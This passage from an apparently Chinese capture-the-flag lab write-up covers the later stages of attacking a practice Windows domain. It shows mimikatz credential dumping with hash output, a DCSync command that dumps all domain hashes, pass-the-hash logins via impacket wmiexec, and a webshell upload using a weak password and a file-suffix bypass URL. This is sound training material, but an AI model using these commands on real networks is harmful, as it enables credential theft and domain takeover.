+<h3 id="3、信息搜集"><a href="#3、信息搜集" class="headerlink" title="3、信息搜集"></a>3、信息搜集</h3><h4 id="（1）凭证抓取"><a href="#（1）凭证抓取" class="headerlink" title="（1）凭证抓取"></a>（1）凭证抓取</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; load kiwi</span><br><span class="line">Loading extension kiwi...</span><br><span class="line">  .#####.   mimikatz 2.2.0 20191125 (x64/windows)</span><br><span class="line"> .## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span><br><span class="line"> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span><br><span class="line"> ## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span><br><span class="line"> &#x27;## v ##&#x27;        Vincent LE TOUX            ( vincent.letoux@gmail.com )</span><br><span class="line">  &#x27;#####&#x27;         &gt; http://pingcastle.com / http://mysmartlogon.com  ***/</span><br><span class="line"></span><br><span class="line">Success.</span><br><span class="line">meterpreter &gt; creds_all </span><br><span class="line">[+] Running as SYSTEM</span><br><span class="line">[*] Retrieving all credentials</span><br><span class="line">msv credentials</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">Username        Domain    NTLM                              SHA1</span><br><span class="line">--------        ------    ----                              ----</span><br><span class="line">XIAORANG-WIN7$  XIAORANG  859b0204ee21404be2bf8c1ff14ca648  8bf9878df010ee424028727f40e5b96d69307814</span><br><span class="line"></span><br><span class="line">wdigest credentials</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">Username        Domain    Password</span><br><span class="line">--------        ------    --------</span><br><span class="line">(null)          (null)    (null)</span><br><span class="line">XIAORANG-WIN7$  XIAORANG  9a a6 4e 6b 23 4e eb e8 72 9a 5c 8b 83 71 9b 2b 1a 92 cf 7b d4 d3 4c d0 1e db 31 fd 98 bc 64 47 55 85 7b 38 e0 63 b9</span><br><span class="line">                           84 5e 9b 01 8e 69 ec e5 7b d7 41 29 bf b8 61 c8 91 e9 e8 2f 7b e2 d0 27 81 45 d2 fe 7a dd fa 23 6f 95 92 60 f5 cc 9</span><br><span class="line">                          a 28 c6 be 5a 83 73 ee 54 66 73 1e d4 af 7f 3d ca 02 43 3c 98 62 da 86 7e 29 7b 16 2c 8e 1b e6 2a 9b 3d bc 4c 8b 69</span><br><span class="line">                          79 1f 9f 20 03 ae 0d 24 4b 96 66 f4 23 6e 09 4a d2 a1 31 ca 49 1b 9a a2 43 f5 99 23 0e 7a 39 ca 65 4d 8f 2a bb 55 f3</span><br><span class="line">                           1e 62 ad c9 0b 24 e4 b0 a5 1e cd 81 67 d5 83 6d 4c 48 5c 8d aa dc 2f d6 47 ab 9b c9 1a 0f 6f 3a 19 36 d6 dc ec 00 c</span><br><span class="line">                          b 76 ae 1f 0a 5c 18 40 1d b3 cc 35 71 bf 32 a0 c3 bd 0f 6b 54 e9 59 01 0e 99 44 23 00 e6 78 a3 95 5c 32 97 34 4f 14</span><br><span class="line">                          70 49 27 4c e9 29 17 9d</span><br><span class="line"></span><br><span class="line">kerberos credentials</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">Username        Domain        Password</span><br><span class="line">--------        ------        --------</span><br><span class="line">(null)          (null)        (null)</span><br><span class="line">xiaorang-win7$  XIAORANG.LAB  9a a6 4e 6b 23 4e eb e8 72 9a 5c 8b 83 71 9b 2b 1a 92 cf 7b d4 d3 4c d0 1e db 31 fd 98 bc 64 47 55 85 7b 38 e0 6</span><br><span class="line">                              3 b9 84 5e 9b 01 8e 69 ec e5 7b d7 41 29 bf b8 61 c8 91 e9 e8 2f 7b e2 d0 27 81 45 d2 fe 7a dd fa 23 6f 95 92 60</span><br><span class="line">                               f5 cc 9a 28 c6 be 5a 83 73 ee 54 66 73 1e d4 af 7f 3d ca 02 43 3c 98 62 da 86 7e 29 7b 16 2c 8e 1b e6 2a 9b 3d</span><br><span class="line">                              bc 4c 8b 69 79 1f 9f 20 03 ae 0d 24 4b 96 66 f4 23 6e 09 4a d2 a1 31 ca 49 1b 9a a2 43 f5 99 23 0e 7a 39 ca 65 4</span><br><span class="line">                              d 8f 2a bb 55 f3 1e 62 ad c9 0b 24 e4 b0 a5 1e cd 81 67 d5 83 6d 4c 48 5c 8d aa dc 2f d6 47 ab 9b c9 1a 0f 6f 3a</span><br><span class="line">                               19 36 d6 dc ec 00 cb 76 ae 1f 0a 5c 18 40 1d b3 cc 35 71 bf 32 a0 c3 bd 0f 6b 54 e9 59 01 0e 99 44 23 00 e6 78</span><br><span class="line">                              a3 95 5c 32 97 34 4f 14 70 49 27 4c e9 29 17 9d</span><br></pre></td></tr></table></figure>
+
+<p>只抓到本机的，尝试一下伪装 DC 与 DC 同步数据来窃取凭证：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; kiwi_cmd &quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot;</span><br><span class="line">[DC] &#x27;xiaorang.lab&#x27; will be the domain</span><br><span class="line">[DC] &#x27;DC01.xiaorang.lab&#x27; will be the DC server</span><br><span class="line">[DC] Exporting domain &#x27;xiaorang.lab&#x27;</span><br><span class="line">[rpc] Service  : ldap</span><br><span class="line">[rpc] AuthnSvc : GSS_NEGOTIATE (9)</span><br><span class="line">502     krbtgt  fb812eea13a18b7fcdb8e6d67ddc205b        514</span><br><span class="line">1106    Marcus  e07510a4284b3c97c8e7dee970918c5c        512</span><br><span class="line">1107    Charles f6a9881cd5ae709abb4ac9ab87f24617        512</span><br><span class="line">1000    DC01$   5867d8e783a85f4316dc8c1ffcd90f8f        532480</span><br><span class="line">500     Administrator   10cf89a850fb1cdbe6bb432b859164c8        512</span><br><span class="line">1104    XIAORANG-OA01$  c7b6d38565056b104fcfcd0f2dbb4c99        4096</span><br><span class="line">1108    XIAORANG-WIN7$  859b0204ee21404be2bf8c1ff14ca648        4096</span><br></pre></td></tr></table></figure>
+
+<p>欺骗成功。</p>
+<p>成功的原理值得探讨一下：</p>
+<p>拆解一下命令：</p>
+<table>
+<thead>
+<tr>
+<th>部分</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>lsadump::dcsync</code></td>
+<td>mimikatz 的 DCSync 攻击模块，模拟域控同步请求</td>
+</tr>
+<tr>
+<td><code>/domain:xiaorang.lab</code></td>
+<td>指定目标域</td>
+</tr>
+<tr>
+<td><code>/all</code></td>
+<td>导出域内<strong>所有用户</strong>的 hash</td>
+</tr>
+<tr>
+<td><code>/csv</code></td>
+<td>以 CSV 格式输出，更易读</td>
+</tr>
+</tbody></table>
+<p>原理：正常情况下两台域控之间会定期同步数据（包括用户密码 hash），DCSync 就是伪装成域控向真实域控发送同步请求，骗取所有用户的 NTLM hash，整个过程不需要登录域控也不需要在域控上落地文件，非常隐蔽。</p>
+<p>但是能成功也需要有个重要前提：执行账户需要有 <code>DS-Replication-Get-Changes</code> 权限，默认域管、Enterprise Admins、域控机器账户才有。我们的主机是 <code>SYSTEM</code> 权限且在域内，所以能成功。</p>
+<h2 id="六、域控登入"><a href="#六、域控登入" class="headerlink" title="六、域控登入"></a>六、域控登入</h2><p>拿之前抓到的凭证登入域控：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proxychains python3 /usr/share/doc/python3-impacket/examples/wmiexec.py xiaorang.lab/administrator@172.22.1.2 -hashes :10cf89a850fb1cdbe6bb432b859164c8</span><br></pre></td></tr></table></figure>
+
+<p>登入后直接搜索 flag：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir flag* /s</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial-%E9%9D%B6%E5%9C%BA-WP%EF%BC%9AThinkPHP-RCE-%E2%86%92-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91-%E2%86%92-%E5%9F%9F%E6%8E%A7%E6%B2%A6%E9%99%B7/file-20260409174318634.png" alt="file-20260409174318634"></p>
+<p>此时才发现靶场给的提示：</p>
+<p><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial-%E9%9D%B6%E5%9C%BA-WP%EF%BC%9AThinkPHP-RCE-%E2%86%92-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91-%E2%86%92-%E5%9F%9F%E6%8E%A7%E6%B2%A6%E9%99%B7/file-20260409174340936.png" alt="file-20260409174340936"></p>
+<p>这里是 03（且是最后一个），那么说明别的其他机子上也有 flag，之前忘记读取了。</p>
+<p>其中一个在入口靶机上（即一开始打下来的那个 Ubuntu），现在找另一个。</p>
+<h2 id="七、172-22-1-18"><a href="#七、172-22-1-18" class="headerlink" title="七、172.22.1.18"></a>七、172.22.1.18</h2><p>之前 DC 欺骗其实把这台靶机的凭证也输出了，因此直接登入：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains python3 /usr/share/doc/python3-impacket/examples/wmiexec.py xiaorang.lab/administrator@172.22.1.18 -hashes :10cf89a850fb1cdbe6bb432b859164c8</span><br></pre></td></tr></table></figure>
+
+<p>老样子查找 flag：</p>
+<p><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial-%E9%9D%B6%E5%9C%BA-WP%EF%BC%9AThinkPHP-RCE-%E2%86%92-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91-%E2%86%92-%E5%9F%9F%E6%8E%A7%E6%B2%A6%E9%99%B7/file-20260409174945768.png" alt="file-20260409174945768"></p>
+<p>成功。</p>
+<p>结合 flag01、flag02、flag03，凭借起来就是完整的 flag。</p>
+<h2 id="八、非预期解"><a href="#八、非预期解" class="headerlink" title="八、非预期解"></a>八、非预期解</h2><p>如果有人先打的 172.22.1.18，就可能会发现这个非预期解。这里简单讲述一下。</p>
+<p>登入 80 后，就可以看到信呼 OA 的具体版本：</p>
+<p><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial-%E9%9D%B6%E5%9C%BA-WP%EF%BC%9AThinkPHP-RCE-%E2%86%92-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91-%E2%86%92-%E5%9F%9F%E6%8E%A7%E6%B2%A6%E9%99%B7/file-20260409175630641.png" alt="file-20260409175630641"></p>
+<p>搜索之后，能知道有一个：未授权任意文件上传 RCE（Nday）</p>
+<p>但是前提是登入管理员界面，通过 Burp 弱密码爆破之后，得到账号与密码：</p>
+<ul>
+<li>账号：admin</li>
+<li>密码：admin123</li>
+</ul>
+<p>登入之后，里面有个文件上传功能：</p>
+<p><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial-%E9%9D%B6%E5%9C%BA-WP%EF%BC%9AThinkPHP-RCE-%E2%86%92-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91-%E2%86%92-%E5%9F%9F%E6%8E%A7%E6%B2%A6%E9%99%B7/file-20260409175816588.png" alt="file-20260409175816588"></p>
+<p>可以直接上传一句话木马，并且在响应页面中有存放路径，但是它会将你的文件后缀改成其他的。</p>
+<p>这里又有一个漏洞，就是文件后缀修改漏洞：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://172.22.1.18/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=&lt;之前看到的文件id&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这样就可以正常访问木马文件了，并且得到的权限是 SYSTEM，后续就是找 Flag，再找域控的麻烦。</p>
+<p>祝大家打靶顺利！</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://beini-faxianl.github.io">谁把我灯关了</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://beini-faxianl.github.io/2026/04/09/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial-%E9%9D%B6%E5%9C%BA-WP%EF%BC%9AThinkPHP-RCE-%E2%86%92-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91-%E2%86%92-%E5%9F%9F%E6%8E%A7%E6%B2%A6%E9%99%B7/">https://beini-faxianl.github.io/2026/04/09/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial-%E9%9D%B6%E5%9C%BA-WP%EF%BC%9AThinkPHP-RCE-%E2%86%92-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91-%E2%86%92-%E5%9F%9F%E6%8E%A7%E6%B2%A6%E9%99%B7/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://beini-faxianl.github.io" target="_blank">A Secret Site</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a><a class="post-meta__tags" href="/tags/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">横向移动</a><a class="post-meta__tags" href="/tags/MS17-010/">MS17-010</a><a class="post-meta__tags" href="/tags/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/">永恒之蓝</a><a class="post-meta__tags" href="/tags/Metasploit/">Metasploit</a><a class="post-meta__tags" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/">域渗透</a><a class="post-meta__tags" href="/tags/Active-Directory/">Active Directory</a><a class="post-meta__tags" href="/tags/Writeup/">Writeup</a><a class="post-meta__tags" href="/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/">春秋云境</a><a class="post-meta__tags" href="/tags/ThinkPHP/">ThinkPHP</a><a class="post-meta__tags" href="/tags/RCE/">RCE</a><a class="post-meta__tags" href="/tags/Webshell/">Webshell</a><a class="post-meta__tags" href="/tags/%E6%8F%90%E6%9D%83/">提权</a><a class="post-meta__tags" href="/tags/MSF/">MSF</a><a class="post-meta__tags" href="/tags/DCSync/">DCSync</a><a class="post-meta__tags" href="/tags/Fscan/">Fscan</a><a class="post-meta__tags" href="/tags/Mimikatz/">Mimikatz</a><a class="post-meta__tags" href="/tags/%E4%BF%A1%E5%91%BCOA/">信呼OA</a><a class="post-meta__tags" href="/tags/%E7%BA%A2%E9%98%9F/">红队</a></div><div class="post-share"><div class="social-share" data-image="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial-%E9%9D%B6%E5%9C%BA-WP%EF%BC%9AThinkPHP-RCE-%E2%86%92-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91-%E2%86%92-%E5%9F%9F%E6%8E%A7%E6%B2%A6%E9%99%B7/3.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/04/04/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%94-WP%EF%BC%9AThinkPHP-RCE-%E2%86%92-%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83-%E2%86%92-%E5%9F%9F%E6%8E%A7%E6%B2%A6%E9%99%B7/" title="红日靶场五 WP：ThinkPHP RCE → 内核提权 → 域控沦陷"><img class="cover" src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%94-WP%EF%BC%9AThinkPHP-RCE-%E2%86%92-%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83-%E2%86%92-%E5%9F%9F%E6%8E%A7%E6%B2%A6%E9%99%B7/cover.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">红日靶场五 WP：ThinkPHP RCE → 内核提权 → 域控沦陷</div></div><div class="info-2"><div class="info-item-1">一、靶场信息我打的是无境靶场中的红日靶场五，其靶机地址和本机地址分别为：  靶场的相关注意事项：   二、信息搜集1、TCP 全端口扫描 + 指纹识别 + 操作系统识别：命令： sudo rustscan -a 192.168.111.150 -r 1-65535 -- -sV -O -Pn -n -oA 192.168.111.150_TCP_ports  输出（仅列举有效信息）： PORT     STATE SERVICE REASON          VERSION80/tcp   open  http    syn-ack ttl 127 Apache httpd 2.4.23 ((Win32) OpenSSL/1.0.2j PHP/5.5.38)3306/tcp open  mysql?  syn-ack ttl 127  OS: Windows Server 2008 R2 or Windows 7 SP1 (96%)  这些信息凝聚成一块得到的结论就是：集成环境 为什么？  原生生态冲突： Windows Server 的“亲儿子”生态是什么？是 IIS Web...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/04/01/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C%EF%BC%9AWebLogic-CVE-2019-2725-%E5%88%B0%E5%9F%9F%E6%8E%A7%E6%B2%A6%E9%99%B7%E5%85%A8%E6%B5%81%E7%A8%8B/" title="红日靶场二：WebLogic CVE-2019-2725 到域控沦陷全流程"><img class="cover" src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C%EF%BC%9AWebLogic-CVE-2019-2725-%E5%88%B0%E5%9F%9F%E6%8E%A7%E6%B2%A6%E9%99%B7%E5%85%A8%E6%B5%81%E7%A8%8B/cover.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-04-01</div><div class="info-item-2">红日靶场二：WebLogic CVE-2019-2725 到域控沦陷全流程</div></div><div class="info-2"><div class="info-item-1">一、靶场信息 相关注意事项：   二、信息搜集1、TCP 端口扫描 + 指纹识别 + 操作系统识别工具：rustscan + nmap nmap 带上 -Pn 参数，表示不进行主机发现，这是为了避免主机发现失败导致的指纹探测失败。 因为 nmap 的默认扫描逻辑是这样的： 主机存活探测（ICMP ping / TCP ping）        ↓    没有响应？        ↓认为主机已下线 → 直接跳过，不扫端口  问题在于，很多主机（尤其是 Windows、有防火墙的服务器）会屏蔽 ICMP，但端口服务完全正常运行。Nmap 误判主机离线，导致你什么都扫不到。 命令： sudo rustscan -a 192.168.111.80 -r 1-65535 -- -sV -O -Pn -n  输出（由于输出很长，只是截取了关键的部分）： PORT      STATE SERVICE        REASON         VERSION80/tcp    open  http           syn-ack ttl 63 Microsoft IIS httpd 7....</div></div></div></a><a class="pagination-related" href="/2026/04/04/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%94-WP%EF%BC%9AThinkPHP-RCE-%E2%86%92-%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83-%E2%86%92-%E5%9F%9F%E6%8E%A7%E6%B2%A6%E9%99%B7/" title="红日靶场五 WP：ThinkPHP RCE → 内核提权 → 域控沦陷"><img class="cover" src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%94-WP%EF%BC%9AThinkPHP-RCE-%E2%86%92-%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83-%E2%86%92-%E5%9F%9F%E6%8E%A7%E6%B2%A6%E9%99%B7/cover.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-04-04</div><div class="info-item-2">红日靶场五 WP：ThinkPHP RCE → 内核提权 → 域控沦陷</div></div><div class="info-2"><div class="info-item-1">一、靶场信息我打的是无境靶场中的红日靶场五，其靶机地址和本机地址分别为：  靶场的相关注意事项：   二、信息搜集1、TCP 全端口扫描 + 指纹识别 + 操作系统识别：命令： sudo rustscan -a 192.168.111.150 -r 1-65535 -- -sV -O -Pn -n -oA 192.168.111.150_TCP_ports  输出（仅列举有效信息）： PORT     STATE SERVICE REASON          VERSION80/tcp   open  http    syn-ack ttl 127 Apache httpd 2.4.23 ((Win32) OpenSSL/1.0.2j PHP/5.5.38)3306/tcp open  mysql?  syn-ack ttl 127  OS: Windows Server 2008 R2 or Windows 7 SP1 (96%)  这些信息凝聚成一块得到的结论就是：集成环境 为什么？  原生生态冲突： Windows Server 的“亲儿子”生态是什么？是 IIS Web...</div></div></div></a><a class="pagination-related" href="/2026/04/01/%E7%AC%AC%E5%8D%81%E4%B9%9D%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B_babygame%EF%BC%9AGodot%EF%BC%9A%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%E4%B8%8EAES%E8%BF%90%E8%A1%8C%E6%97%B6%E5%AF%86%E9%92%A5%E6%9B%BF%E6%8D%A2/" title="第十九届全国大学生信息安全竞赛_babygame：Godot：游戏逆向与AES运行时密钥替换"><img class="cover" src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/%E7%AC%AC%E5%8D%81%E4%B9%9D%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B_babygame%EF%BC%9AGodot%EF%BC%9A%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%E4%B8%8EAES%E8%BF%90%E8%A1%8C%E6%97%B6%E5%AF%86%E9%92%A5%E6%9B%BF%E6%8D%A2/cover.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-04-01</div><div class="info-item-2">第十九届全国大学生信息安全竞赛_babygame：Godot：游戏逆向与AES运行时密钥替换</div></div><div class="info-2"><div class="info-item-1">一、分析附件题目给了一个 .exe 文件，对于未知二进制的第一步不是上 IDA，而是先识别它是什么。 010 Editor 搜索关键字符串是成本最低的侦察手段，丢到 010 中分析一波：   在查找“flag”字符串的时候，发现了文件 flag.gd、flag.scn 文件，上网搜索之后得知这是一个 Godot 引擎打包的游戏：  与该引擎相关的文件后缀：    后缀 是什么 编译前版本    project.godot 项目配置，文本 -   project.binary 项目配置，二进制 project.godot   .gd GDScript 源码 -   .gdc GDScript 字节码 .gd   .tscn 场景文件，文本 -   .scn 场景文件，二进制 .tscn   .tres 资源文件，文本 -   .res 资源文件，二进制 .tres   .remap 资源重定向索引 -   关于该引擎有专门的工具用于反编译，我这用的是”gdsdecomp”  项目地址：https://github.com/GDRETools/gdsdecomp  二、反编译将游戏文...</div></div></div></a><a class="pagination-related" href="/2026/04/01/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/" title="红日靶场一"><img class="cover" src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/cover.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-04-01</div><div class="info-item-2">红日靶场一</div></div><div class="info-2"><div class="info-item-1">靶场信息：   靶场的相关说明：   一、端口扫描使用工具 rustscan，命令： rustscan -a 192.168.111.20 --top  结果： PORT    STATE SERVICE      REASON80/tcp  open  http         syn-ack ttl 127135/tcp open  msrpc        syn-ack ttl 127139/tcp open  netbios-ssn  syn-ack ttl 127445/tcp open  microsoft-ds syn-ack ttl 127  二、永恒之蓝看到 445 端口开着，条件反射去看看有没有存在永恒之蓝漏洞。 在 nmap 的脚本目录下找到对应检测脚本： ┌──(penv)─(zyf㉿kali)-[/usr/share/nmap/scripts]└─$ ls | grep ms17-010smb-vuln-ms17-010.nse  利用 nmap 验证： nmap --script smb-vuln-ms17-010 192.168.111.20 -p...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/author.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">谁把我灯关了</div><div class="author-info-description">??????????</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">6</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">45</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/beini-faxianl"><i class="fab fa-github"></i><span>Visit GitHub</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/beini-faxianl" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://blog.csdn.net/2301_76794844?type=blog" target="_blank" title="CSDN"><i class="fa fa-book-open"></i></a><a class="social-icon" href="https://www.cnblogs.com/youdiscovered1t" target="_blank" title="博客园"><i class="fa fa-pen-nib"></i></a><a class="social-icon" href="mailto:1436319009@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">CTF / Security / Notes / Life</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E9%9D%B6%E5%9C%BA%E4%BB%8B%E7%BB%8D-%E7%8E%AF%E5%A2%83%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">一、靶场介绍 &amp; 环境信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">二、信息搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%8180-%E7%AB%AF%E5%8F%A3"><span class="toc-number">3.</span> <span class="toc-text">三、80 端口</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E5%81%87%E7%9A%84%E7%99%BB%E5%85%A5%E7%95%8C%E9%9D%A2"><span class="toc-number">3.1.</span> <span class="toc-text">1、假的登入界面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E7%9B%AE%E5%BD%95%E7%88%86%E7%A0%B4"><span class="toc-number">3.2.</span> <span class="toc-text">2、目录爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81ThinkPHP"><span class="toc-number">3.3.</span> <span class="toc-text">3、ThinkPHP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E3%80%81%E5%86%99%E5%85%A5%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-number">3.4.</span> <span class="toc-text">4、写入一句话木马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5%E3%80%81%E8%9A%81%E5%89%91%E8%BF%9E%E6%8E%A5"><span class="toc-number">3.5.</span> <span class="toc-text">5、蚁剑连接</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">3.5.1.</span> <span class="toc-text">（1）信息搜集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E6%8F%90%E6%9D%83"><span class="toc-number">3.5.2.</span> <span class="toc-text">（2）提权</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81Fscan-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">4.</span> <span class="toc-text">四、Fscan 内网信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E4%B8%8A%E4%BC%A0-Fscan"><span class="toc-number">4.1.</span> <span class="toc-text">1、上传 Fscan</span></a></li><li class="toc-item toc-level-3"><a 